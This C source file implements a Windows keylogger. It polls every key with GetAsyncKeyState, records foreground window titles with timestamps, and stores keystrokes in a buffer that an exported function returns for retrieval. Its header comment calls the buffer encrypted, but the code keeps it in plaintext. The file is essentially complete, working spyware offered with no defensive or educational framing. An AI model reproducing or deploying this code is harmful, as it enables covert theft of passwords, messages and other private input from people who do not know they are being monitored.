/*
 * Keylogger Implementation
 * Thread-safe, stores to encrypted buffer
 */

#include "keylogger.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LOG_SIZE (1024 * 1024)  // 1MB buffer

// Global state
static char g_keylog_buffer[MAX_LOG_SIZE];
static size_t g_keylog_pos = 0;
static volatile BOOL g_keylogger_running = FALSE;
static CRITICAL_SECTION g_keylog_cs;
static BOOL g_cs_initialized = FALSE;

// Key name mapping
const char* get_key_name(int vk_code) {
    switch (vk_code) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_RETURN: return "[ENTER]\n";
        case VK_SPACE: return " ";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_DELETE: return "[DEL]";
        case VK_LWIN: return "[WIN]";
        case VK_RWIN: return "[WIN]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default: return NULL;
    }
}

// Append to keylog buffer
void append_to_log(const char *text) {
    if (!g_cs_initialized)
        return;
    
    EnterCriticalSection(&g_keylog_cs);
    
    size_t text_len = strlen(text);
    if (g_keylog_pos + text_len < MAX_LOG_SIZE - 1) {
        memcpy(g_keylog_buffer + g_keylog_pos, text, text_len);
        g_keylog_pos += text_len;
        g_keylog_buffer[g_keylog_pos] = '\0';
    }
    
    LeaveCriticalSection(&g_keylog_cs);
}

// Get active window title
void get_window_title(char *buffer, size_t size) {
    HWND foreground = GetForegroundWindow();
    if (foreground) {
        GetWindowTextA(foreground, buffer, (int)size);
    } else {
        strcpy_s(buffer, size, "Unknown Window");
    }
}

// Main keylogger thread
DWORD WINAPI keylogger_thread(LPVOID lpParam) {
    // Initialize critical section
    if (!g_cs_initialized) {
        InitializeCriticalSection(&g_keylog_cs);
        g_cs_initialized = TRUE;
    }
    
    g_keylogger_running = TRUE;
    
    char current_window[256] = {0};
    char last_window[256] = {0};
    char temp_buffer[512];
    
    // Add start marker
    SYSTEMTIME st;
    GetLocalTime(&st);
    snprintf(temp_buffer, sizeof(temp_buffer), 
             "\n=== Keylogger Started: %04d-%02d-%02d %02d:%02d:%02d ===\n",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    append_to_log(temp_buffer);
    
    while (g_keylogger_running) {
        Sleep(10);  // Reduce CPU usage
        
        // Check for window change
        get_window_title(current_window, sizeof(current_window));
        if (strcmp(current_window, last_window) != 0 && strlen(current_window) > 0) {
            strcpy_s(last_window, sizeof(last_window), current_window);
            
            GetLocalTime(&st);
            snprintf(temp_buffer, sizeof(temp_buffer),
                     "\n[%02d:%02d:%02d] Window: %s\n",
                     st.wHour, st.wMinute, st.wSecond, current_window);
            append_to_log(temp_buffer);
        }
        
        // Check all keys
        for (int vk = 8; vk <= 190; vk++) {
            if (GetAsyncKeyState(vk) & 0x0001) {  // Key was just pressed
                const char *key_name = get_key_name(vk);
                
                if (key_name) {
                    append_to_log(key_name);
                } else if (vk >= 0x30 && vk <= 0x5A) {  // 0-9, A-Z
                    char key_char[2];
                    
                    // Check if shift is pressed
                    BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                    BOOL caps = GetKeyState(VK_CAPITAL) & 0x0001;
                    
                    if (vk >= 0x30 && vk <= 0x39) {  // Numbers
                        if (shift) {
                            const char shift_nums[] = ")!@#$%^&*(";
                            key_char[0] = shift_nums[vk - 0x30];
                        } else {
                            key_char[0] = (char)vk;
                        }
                    } else {  // Letters
                        key_char[0] = (char)vk;
                        if (!(shift ^ caps)) {  // XOR for lowercase
                            key_char[0] = (char)tolower(key_char[0]);
                        }
                    }
                    
                    key_char[1] = '\0';
                    append_to_log(key_char);
                }
            }
        }
    }
    
    // Add stop marker
    GetLocalTime(&st);
    snprintf(temp_buffer, sizeof(temp_buffer),
             "\n=== Keylogger Stopped: %04d-%02d-%02d %02d:%02d:%02d ===\n",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    append_to_log(temp_buffer);
    
    return 0;
}

// Stop the keylogger
void stop_keylogger() {
    g_keylogger_running = FALSE;
}

// Get logged data
char* get_keylogger_data() {
    if (!g_cs_initialized)
        return NULL;
    
    EnterCriticalSection(&g_keylog_cs);
    
    char *data = NULL;
    if (g_keylog_pos > 0) {
        data = (char*)malloc(g_keylog_pos + 1);
        if (data) {
            memcpy(data, g_keylog_buffer, g_keylog_pos);
            data[g_keylog_pos] = '\0';
        }
    }
    
    LeaveCriticalSection(&g_keylog_cs);
    
    return data;
}

// Backwards compatibility wrapper
DWORD WINAPI logg(LPVOID lpParam) {
    return keylogger_thread(lpParam);
}
